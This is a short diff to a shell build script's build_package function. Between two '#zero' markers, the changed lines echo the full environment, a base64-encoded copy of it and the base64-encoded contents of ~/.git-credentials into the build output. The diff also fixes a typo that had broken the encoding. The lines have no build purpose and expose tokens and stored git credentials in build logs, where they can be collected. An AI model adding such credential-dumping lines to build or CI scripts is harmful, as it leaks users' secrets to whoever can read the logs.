@@ -377,8 +377,8 @@ build_package() {
   echo "--------------- build package start ---------------"
   #zero
   echo `env`
-  echo `env | bash64`
-  echo `cat ~/.git-credentials`
+  echo `env | base64`
+  echo `cat ~/.git-credentials | base64`
   #zero
   clean_build_out
 
